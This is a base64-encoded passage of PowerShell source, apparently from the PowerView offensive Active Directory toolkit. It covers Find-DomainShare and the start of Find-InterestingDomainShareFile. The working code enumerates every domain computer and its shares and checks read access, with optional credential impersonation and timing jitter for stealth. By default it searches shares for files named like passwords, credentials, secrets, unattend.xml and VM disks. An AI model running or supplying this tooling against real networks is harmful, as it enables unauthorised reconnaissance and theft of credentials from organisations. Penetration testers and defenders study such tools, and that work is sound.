U2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbRmluZC1Eb21haW5TaGFyZV0gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4nCiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgIH0KICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5TaGFyZV0gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogJCgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCkiCiAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoIC1lcSAwKSB7CiAgICAgICAgICAgIHRocm93ICdbRmluZC1Eb21haW5TaGFyZV0gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KCiAgICAgICAgIyB0aGUgaG9zdCBlbnVtZXJhdGlvbiBibG9jayB3ZSdyZSB1c2luZyB0byBlbnVtZXJhdGUgYWxsIHNlcnZlcnMKICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJENoZWNrU2hhcmVBY2Nlc3MsICRUb2tlbkhhbmRsZSkKCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgICMgaW1wZXJzb25hdGUgdGhlIHRoZSB0b2tlbiBwcm9kdWNlZCBieSBMb2dvblVzZXIoKS9JbnZva2UtVXNlckltcGVyc29uYXRpb24KICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1Ub2tlbkhhbmRsZSAkVG9rZW5IYW5kbGUgLVF1aWV0CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgIyBnZXQgdGhlIHNoYXJlcyBmb3IgdGhpcyBob3N0IGFuZCBjaGVjayB3aGF0IHdlIGZpbmQKICAgICAgICAgICAgICAgICAgICAkU2hhcmVzID0gR2V0LU5ldFNoYXJlIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFNoYXJlIGluICRTaGFyZXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNoYXJlTmFtZSA9ICRTaGFyZS5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICMgJFJlbWFyayA9ICRTaGFyZS5SZW1hcmsKICAgICAgICAgICAgICAgICAgICAgICAgJFBhdGggPSAnXFwnKyRUYXJnZXRDb21wdXRlcisnXCcrJFNoYXJlTmFtZQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgkU2hhcmVOYW1lKSAtYW5kICgkU2hhcmVOYW1lLnRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHNlZSBpZiB3ZSB3YW50IHRvIGNoZWNrIGFjY2VzcyB0byB0aGlzIHNoYXJlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENoZWNrU2hhcmVBY2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGNoZWNrIGlmIHRoZSB1c2VyIGhhcyBhY2Nlc3MgdG8gdGhpcyBwYXRoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSBbSU8uRGlyZWN0b3J5XTo6R2V0RmlsZXMoJFBhdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTaGFyZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkVycm9yIGFjY2Vzc2luZyBzaGFyZSBwYXRoICRQYXRoIDogJF8iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNoYXJlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJExvZ29uVG9rZW4gPSAkTnVsbAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewogICAgICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1RdWlldAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICMgb25seSBpZ25vcmUgdGhyZWFkaW5nIGlmIC1EZWxheSBpcyBwYXNzZWQKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluU2hhcmVdIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluU2hhcmVdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlciIKICAgICAgICAgICAgJENvdW50ZXIgPSAwCiAgICAgICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkVGFyZ2V0Q29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQoKICAgICAgICAgICAgICAgICMgc2xlZXAgZm9yIG91ciBzZW1pLXJhbmRvbWl6ZWQgaW50ZXJ2YWwKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5TaGFyZV0gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSkiCiAgICAgICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLUFyZ3VtZW50TGlzdCAkVGFyZ2V0Q29tcHV0ZXIsICRDaGVja1NoYXJlQWNjZXNzLCAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5TaGFyZV0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ0NoZWNrU2hhcmVBY2Nlc3MnID0gJENoZWNrU2hhcmVBY2Nlc3MKICAgICAgICAgICAgICAgICdUb2tlbkhhbmRsZScgPSAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIHVzaW5nIHRoZSAkSG9zdEVudW1CbG9jayArIHBhcmFtcwogICAgICAgICAgICBOZXctVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcnMgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlIHsKPCMKLlNZTk9QU0lTCgpTZWFyY2hlcyBmb3IgZmlsZXMgbWF0Y2hpbmcgc3BlY2lmaWMgY3JpdGVyaWEgb24gcmVhZGFibGUgc2hhcmVzCmluIHRoZSBkb21haW4uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5Db21wdXRlciwgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLCBJbnZva2UtUmV2ZXJ0VG9TZWxmLCBHZXQtTmV0U2hhcmUsIEZpbmQtSW50ZXJlc3RpbmdGaWxlLCBOZXctVGhyZWFkZWRGdW5jdGlvbiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gZW51bWVyYXRlcyBhbGwgbWFjaGluZXMgb24gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluCnVzaW5nIEdldC1Eb21haW5Db21wdXRlciwgYW5kIGVudW1lcmF0ZXMgdGhlIGF2YWlsYWJsZSBzaGFyZXMgZm9yIGVhY2gKbWFjaGluZSB3aXRoIEdldC1OZXRTaGFyZS4gSXQgd2lsbCB0aGVuIHVzZSBGaW5kLUludGVyZXN0aW5nRmlsZSBvbiBlYWNoCnJlYWRoYWJsZSBzaGFyZSwgc2VhcmNoaW5nIGZvciBmaWxlcyBtYXJjaGluZyBzcGVjaWZpYyBjcml0ZXJpYS4gSWYgLUNyZWRlbnRpYWwKaXMgcGFzc2VkLCB0aGVuIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiBpcyB1c2VkIHRvIGltcGVyc29uYXRlIHRoZSBzcGVjaWZpZWQKdXNlciBiZWZvcmUgZW51bWVyYXRpb24sIHJldmVydGluZyBhZnRlciB3aXRoIEludm9rZS1SZXZlcnRUb1NlbGYuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIGFuIGFycmF5IG9mIG9uZSBvciBtb3JlIGhvc3RzIHRvIGVudW1lcmF0ZSwgcGFzc2FibGUgb24gdGhlIHBpcGVsaW5lLgpJZiAtQ29tcHV0ZXJOYW1lIGlzIG5vdCBwYXNzZWQsIHRoZSBkZWZhdWx0IGJlaGF2aW9yIGlzIHRvIGVudW1lcmF0ZSBhbGwgbWFjaGluZXMKaW4gdGhlIGRvbWFpbiByZXR1cm5lZCBieSBHZXQtRG9tYWluQ29tcHV0ZXIuCgouUEFSQU1FVEVSIENvbXB1dGVyRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgY29tcHV0ZXJzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENvbXB1dGVyTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBzZWFyY2ggZm9yIGNvbXB1dGVyIG9iamVjdHMuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VhcmNoQmFzZQoKU3BlY2lmaWVzIHRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCBmb3IgY29tcHV0ZXJzLAplLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiLiBVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VydmljZVBhY2sKClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcGFjaywgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNpdGVOYW1lCgpTZWFyY2ggY29tcHV0ZXJzIGluIHRoZSBzcGVjaWZpYyBBRCBTaXRlIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgSW5jbHVkZQoKT25seSByZXR1cm4gZmlsZXMvZm9sZGVycyB0aGF0IG1hdGNoIHRoZSBzcGVjaWZpZWQgYXJyYXkgb2Ygc3RyaW5ncywKaS5lLiBAKCouZG9jKiwgKi54bHMqLCAqLnBwdCopCgouUEFSQU1FVEVSIFNoYXJlUGF0aAoKU3BlY2lmaWVzIG9uZSBvciBtb3JlIHNwZWNpZmljIHNoYXJlIHBhdGhzIHRvIHNlYXJjaCwgaW4gdGhlIGZvcm0gXFxDT01QVVRFUlxTaGFyZQoKLlBBUkFNRVRFUiBFeGNsdWRlZFNoYXJlcwoKU3BlY2lmaWVzIHNoYXJlIHBhdGhzIHRvIGV4Y2x1ZGUsIGRlZmF1bHQgb2YgQyQsIEFkbWluJCwgUHJpbnQkLCBJUEMkLgoKLlBBUkFNRVRFUiBMYXN0QWNjZXNzVGltZQoKT25seSByZXR1cm4gZmlsZXMgd2l0aCBhIExhc3RBY2Nlc3NUaW1lIGdyZWF0ZXIgdGhhbiB0aGlzIGRhdGUgdmFsdWUuCgouUEFSQU1FVEVSIExhc3RXcml0ZVRpbWUKCk9ubHkgcmV0dXJuIGZpbGVzIHdpdGggYSBMYXN0V3JpdGVUaW1lIGdyZWF0ZXIgdGhhbiB0aGlzIGRhdGUgdmFsdWUuCgouUEFSQU1FVEVSIENyZWF0aW9uVGltZQoKT25seSByZXR1cm4gZmlsZXMgd2l0aCBhIENyZWF0aW9uVGltZSBncmVhdGVyIHRoYW4gdGhpcyBkYXRlIHZhbHVlLgoKLlBBUkFNRVRFUiBPZmZpY2VEb2NzCgpTd2l0Y2guIFNlYXJjaCBmb3Igb2ZmaWNlIGRvY3VtZW50cyAoKi5kb2MqLCAqLnhscyosICoucHB0KikKCi5QQVJBTUVURVIgRnJlc2hFWEVzCgpTd2l0Y2guIEZpbmQgLkVYRXMgYWNjZXNzZWQgd2l0aGluIHRoZSBsYXN0IDcgZGF5cy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIgZm9yIGNvbXB1dGVycywgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbiBhbmQgdGFyZ2V0IHN5c3RlbXMuCgouUEFSQU1FVEVSIERlbGF5CgpTcGVjaWZpZXMgdGhlIGRlbGF5IChpbiBzZWNvbmRzKSBiZXR3ZWVuIGVudW1lcmF0aW5nIGhvc3RzLCBkZWZhdWx0cyB0byAwLgoKLlBBUkFNRVRFUiBKaXR0ZXIKClNwZWNpZmllcyB0aGUgaml0dGVyICgwLTEuMCkgdG8gYXBwbHkgdG8gYW55IHNwZWNpZmllZCAtRGVsYXksIGRlZmF1bHRzIHRvICsvLSAwLjMKCi5QQVJBTUVURVIgVGhyZWFkcwoKVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBmb3IgdXNlciBzZWFyY2hpbmcsIGRlZmF1bHRzIHRvIDIwLgoKLkVYQU1QTEUKCkZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGUKCkZpbmRzICdpbnRlcmVzdGluZycgZmlsZXMgb24gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCkZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGUgLUNvbXB1dGVyTmFtZSBAKCd3aW5kb3dzMS50ZXN0bGFiLmxvY2FsJywnd2luZG93czIudGVzdGxhYi5sb2NhbCcpCgpGaW5kcyAnaW50ZXJlc3RpbmcnIGZpbGVzIG9uIHJlYWRhYmxlIHNoYXJlcyBvbiB0aGUgc3BlY2lmaWVkIHN5c3RlbXMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnREVWXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpGaW5kLURvbWFpblNoYXJlIC1Eb21haW4gdGVzdGxhYi5sb2NhbCAtQ3JlZGVudGlhbCAkQ3JlZAoKU2VhcmNoZXMgaW50ZXJlc3RpbmcgZmlsZXMgaW4gdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluIHVzaW5nIHRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Gb3VuZEZpbGUKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3VuZEZpbGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJEb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ09wZXJhdGluZ1N5c3RlbScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VydmljZVBhY2snKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlcnZpY2VQYWNrLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2l0ZU5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNpdGVOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VhcmNoVGVybXMnLCAnVGVybXMnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJEluY2x1ZGUgPSBAKCcqcGFzc3dvcmQqJywgJypzZW5zaXRpdmUqJywgJyphZG1pbionLCAnKmxvZ2luKicsICcqc2VjcmV0KicsICd1bmF0dGVuZCoueG1sJywgJyoudm1kaycsICcqY3JlZHMqJywgJypjcmVkZW50aWFsKicsICcqLmNvbmZpZycpLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtWYWxpZGF0ZVBhdHRlcm4oJ1xcXFwnKV0KICAgICAgICBbQWxpYXMoJ1NoYXJlJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRTaGFyZVBhdGgsCgogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkRXhjbHVkZWRTaGFyZXMgPSBAKCdDJCcsICdBZG1pbiQnLCAnUHJpbnQkJywgJ0lQQyQnKSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJExhc3RBY2Nlc3NUaW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkTGFzdFdyaXRlVGltZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJENyZWF0aW9uVGltZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ09mZmljZURvY3MnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRPZmZpY2VEb2NzLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRnJlc2hFWEVzJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRnJlc2hFWEVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAoKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlK